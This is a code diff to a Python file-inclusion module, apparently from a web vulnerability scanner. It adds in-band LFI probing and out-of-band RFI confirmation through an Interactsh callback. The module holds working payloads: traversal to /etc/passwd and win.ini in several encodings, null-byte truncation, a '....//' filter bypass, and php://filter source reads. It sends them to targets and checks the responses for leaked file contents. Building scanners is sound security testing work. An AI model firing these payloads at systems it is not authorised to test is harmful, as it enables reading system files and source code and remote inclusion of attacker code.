@@ -18,11 +18,13 @@ from __future__ import annotations
 import base64
 import json
 import re
+import time
 import uuid
 from pathlib import Path
 from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
 from modules.active_probe_base import ActiveProbeBase
+from modules.oob_client import OOBClientMixin
 
 # Parameter names commonly bound to file inclusion.
 LFI_PARAM_HINTS = frozenset({
@@ -48,8 +50,26 @@ LFI_SIGNATURES = [
     (re.compile(r"<\?php"), "PHP source disclosure"),
 ]
 
+# Curated, high-signal in-band LFI payloads (infra-free confirmer). Each entry is
+# (payload, technique) and covers traversal depth, URL / double-URL encoding, the
+# ....// normalisation bypass, legacy null-byte truncation, and Windows targets.
+# php://filter source-disclosure payloads are generated per-page in _lfi_payloads.
+_INBAND_LFI_BASE = [
+    ("/etc/passwd", "absolute path"),
+    ("../../../../../../../../etc/passwd", "path traversal"),
+    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url-encoded traversal"),
+    ("..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", "double-url-encoded traversal"),
+    ("....//....//....//....//....//....//etc/passwd", "....// normalisation bypass"),
+    ("../../../../../../etc/passwd%00", "null-byte truncation"),
+    ("../../../../../../etc/passwd%00.png", "null-byte + extension"),
+    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "windows traversal"),
+    ("C:\\windows\\win.ini", "windows absolute path"),
+]
+# Long base64 blob (php://filter output) → decode and look for PHP source.
+_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
 
-class FileInclusionModule(ActiveProbeBase):
+
+class FileInclusionModule(OOBClientMixin, ActiveProbeBase):
     name = "file_inclusion"
     description = "LFI / RFI Fuzzing (ffuf + SecLists)"
     required_tools: list[str] = []
@@ -62,6 +82,7 @@ class FileInclusionModule(ActiveProbeBase):
         self.parameter_results = parameter_results or {}
         self.fuzzer_results = fuzzer_results or {}
         self.live_hosts = live_hosts or []
+        self._oob_process = None
         (self.module_dir / "ffuf").mkdir(exist_ok=True)
 
     # ── Public API ─────────────────────────────────────────────────────────────
@@ -77,14 +98,21 @@ class FileInclusionModule(ActiveProbeBase):
 
         lfi_hits: list[dict] = []
         if cfg.get("lfi", True):
+            # 1. Fast infra-free in-band probe (encodings, null-byte, php://filter).
+            inband = self._run_inband_lfi(targets, cfg) if cfg.get("inband_lfi", True) else []
+            lfi_hits.extend(inband)
+            confirmed = {(self._base(h["url"]), h["param"].lower()) for h in inband}
+            # 2. Broad ffuf + SecLists sweep over params not already confirmed.
             if self.has_tool("ffuf"):
-                lfi_hits = self._run_lfi(targets, cfg)
-            else:
+                lfi_hits.extend(self._run_lfi(targets, cfg, confirmed))
+            elif not inband:
                 self.warn("ffuf not installed — LFI fuzzing skipped")
 
         rfi_hits: list[dict] = []
         if cfg.get("rfi", True):
-            rfi_hits = self._run_rfi(targets, cfg)
+            rfi_hits = self._run_rfi(targets, cfg)                      # data:// wrapper (in-band)
+            if cfg.get("rfi_oob", True):
+                rfi_hits.extend(self._run_oob_rfi(targets, cfg))       # true remote URL via Interactsh
 
         findings = [self._lfi_finding(h) for h in lfi_hits] + [self._rfi_finding(h) for h in rfi_hits]
         findings = self.dedup_findings(findings)
@@ -102,8 +130,74 @@ class FileInclusionModule(ActiveProbeBase):
         r = self.results
         return f"📂 {len(r.get('lfi', []))} LFI, {len(r.get('rfi', []))} RFI hit(s)"
 
+    # ── In-band LFI probe (infra-free confirmer) ────────────────────────────────
+    def _run_inband_lfi(self, targets: list[dict], cfg: dict) -> list[dict]:
+        """Probe each candidate with a small curated payload set and confirm via
+        real file-content signatures — fast, and it catches encoding bypasses and
+        php://filter source disclosure that a plain ffuf wordlist sweep misses."""
+        import requests
+        session = requests.Session()
+        session.verify = False
+        timeout = self.request_timeout()
+        max_requests = int(cfg.get("max_lfi_requests", 120))
+        sent = 0
+        hits: list[dict] = []
+        for target in targets:
+            payloads = self._lfi_payloads(self._page_basename(target["url"]))
+            for param in target["params"]:
+                if sent >= max_requests:
+                    return hits
+                for payload, technique in payloads:
+                    if sent >= max_requests:
+                        return hits
+                    probe = self._inject_value(target["url"], param, payload)
+                    resp = self.http_get(probe, session=session, timeout=timeout, verify=False)
+                    sent += 1
+                    if resp is None:
+                        continue
+                    sig = self._detect_lfi(resp.text or "")
+                    if sig:
+                        hits.append({"url": target["url"], "param": param, "payload": payload,
+                                     "match_url": probe, "status": resp.status_code,
+                                     "signature": sig, "technique": technique, "tool": "in-band probe"})
+                        break  # one confirmation per parameter is enough
+        return hits
+
+    def _lfi_payloads(self, page: str) -> list[tuple[str, str]]:
+        payloads = list(_INBAND_LFI_BASE)
+        seen: set[str] = set()
+        for res in ([page] if page else []) + ["index", "index.php", "config", "config.php"]:
+            if res and res not in seen:
+                seen.add(res)
+                payloads.append((f"php://filter/convert.base64-encode/resource={res}",
+                                 f"php://filter source read ({res})"))
+        return payloads
+
+    @staticmethod
+    def _detect_lfi(body: str) -> str:
+        if re.search(r"root:.*?:0:0:", body):
+            return "/etc/passwd (Linux)"
+        if re.search(r"\[fonts\]|\[extensions\]|for 16-bit app support", body, re.I):
+            return "win.ini (Windows)"
+        if "<?php" in body:
+            return "PHP source disclosure"
+        for blob in _B64_BLOB_RE.findall(body):
+            try:
+                decoded = base64.b64decode(blob, validate=True)
+            except Exception:
+                continue
+            if b"<?php" in decoded or b"<?=" in decoded:
+                return "PHP source via php://filter (base64)"
+        return ""
+
+    @staticmethod
+    def _page_basename(url: str) -> str:
+        name = urlparse(url).path.rsplit("/", 1)[-1]
+        return name if name and "." in name else ""
+
     # ── LFI via ffuf + SecLists ─────────────────────────────────────────────────
-    def _run_lfi(self, targets: list[dict], cfg: dict) -> list[dict]:
+    def _run_lfi(self, targets: list[dict], cfg: dict, skip: set | None = None) -> list[dict]:
+        skip = skip or set()
         wordlists = self._wordlists(cfg)
         if not wordlists:
             self.warn("No LFI wordlist found (set scan.file_inclusion.lfi_wordlists)")
@@ -118,6 +212,8 @@ class FileInclusionModule(ActiveProbeBase):
         index = 0
         for target in targets:
             for param in target["params"]:
+                if (self._base(target["url"]), param.lower()) in skip:
+                    continue  # already confirmed by the in-band probe
                 fuzz_url = self._inject_fuzz(target["url"], param)
                 for wordlist in wordlists:
                     index += 1
@@ -189,6 +285,52 @@ class FileInclusionModule(ActiveProbeBase):
                         break
         return hits
 
+    # ── RFI via OOB Interactsh callback (true remote inclusion) ──────────────────
+    def _run_oob_rfi(self, targets: list[dict], cfg: dict) -> list[dict]:
+        """Confirm real Remote File Inclusion: inject an attacker URL on the
+        Interactsh callback domain; if the server fetches it (allow_url_include),
+        Interactsh records the interaction — proof of remote inclusion."""
+        runtime = self._start_oob_runtime(cfg)
+        callback = str(runtime.get("callback_url", "")).strip()
+        if not callback:
+            if runtime.get("client_available") is False:
+                self.info("interactsh-client not installed — OOB RFI skipped")
+            else:
+                self.info("No Interactsh callback URL — OOB RFI skipped")
+            self._stop_oob_client(runtime)
+            return []
+
+        timeout = self.request_timeout()
+        max_requests = int(cfg.get("max_rfi_requests", 80))
+        sent: list[dict] = []
+        try:
+            for target in targets:
+                for param in target["params"]:
+                    if len(sent) >= max_requests:
+                        break
+                    token = f"rfi{len(sent):04d}"
+                    payload = self._oob_url(callback, token, "/reconx.txt")
+                    probe = self._inject_value(target["url"], param, payload)
+                    self.http_get(probe, timeout=timeout, verify=False)
+                    sent.append({"url": probe, "param": param, "payload": payload, "token": token})
+
+            wait = float(cfg.get("rfi_oob_wait", runtime.get("cooldown_period", 5)))
+            if wait > 0:
+                time.sleep(wait)
+
+            interactions = self._read_oob_interactions(runtime)
+            hits: list[dict] = []
+            for item in sent:
+                matches = self._matching_interactions(interactions, item["token"], callback)
+                if matches:
+                    hits.append({"url": item["url"], "param": item["param"], "payload": item["payload"],
+                                 "marker": item["token"], "wrapper": "http:// (OOB)",
+                                 "callback_url": callback, "interactions": matches[:5],
+                                 "tool": "interactsh"})
+            return hits
+        finally:
+            self._stop_oob_client(runtime)
+
     # ── Findings ────────────────────────────────────────────────────────────────
     def _lfi_finding(self, hit: dict) -> dict:
         return self.make_finding(
@@ -203,22 +345,33 @@ class FileInclusionModule(ActiveProbeBase):
             exploitability="confirmed",
             evidence={"param": hit["param"], "payload": hit["payload"],
                       "signature": hit["signature"], "status": hit.get("status"),
-                      "wordlist": hit.get("wordlist", ""), "tool": "ffuf"},
+                      "wordlist": hit.get("wordlist", ""), "technique": hit.get("technique", ""),
+                      "tool": hit.get("tool", "ffuf")},
         )
 
     def _rfi_finding(self, hit: dict) -> dict:
+        oob = hit.get("tool") == "interactsh"
+        evidence = {"param": hit["param"], "payload": hit["payload"],
+                    "marker": hit["marker"], "wrapper": hit["wrapper"]}
+        if oob:
+            evidence["callback_url"] = hit.get("callback_url", "")
+            evidence["interactions"] = hit.get("interactions", [])
         return self.make_finding(
             "rfi_detected",
             hit["url"],
-            title=f"Remote/URL-wrapper inclusion via '{hit['param']}' (data://)",
-            description=("A data:// wrapper payload was reflected, showing the parameter includes "
-                         "URL wrappers (allow_url_include on) — Remote File Inclusion is possible."),
+            title=(f"Remote File Inclusion via '{hit['param']}' (OOB callback)" if oob
+                   else f"Remote/URL-wrapper inclusion via '{hit['param']}' (data://)"),
+            description=(
+                "The parameter caused the server to fetch an attacker-controlled remote URL — an "
+                "Interactsh callback fired, confirming Remote File Inclusion (allow_url_include on)."
+                if oob else
+                "A data:// wrapper payload was reflected, showing the parameter includes URL "
+                "wrappers (allow_url_include on) — Remote File Inclusion is possible."),
             severity="HIGH",
-            confidence=0.8,
+            confidence=0.95 if oob else 0.8,
             finding_type="rfi_detected",
             exploitability="confirmed",
-            evidence={"param": hit["param"], "payload": hit["payload"],
-                      "marker": hit["marker"], "wrapper": hit["wrapper"]},
+            evidence=evidence,
         )
 
     # ── Target / wordlist / URL helpers ─────────────────────────────────────────
@@ -278,6 +431,11 @@ class FileInclusionModule(ActiveProbeBase):
         # urlencode leaves the bare FUZZ keyword intact (no reserved chars), so
         # ffuf still sees it in the query string.
         return urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
+
+    @staticmethod
+    def _base(url: str) -> str:
+        parsed = urlparse(url)
+        return urlunparse(parsed._replace(query="", fragment=""))
 
     @staticmethod
     def _bounded(value, minimum: int, maximum: int) -> int:
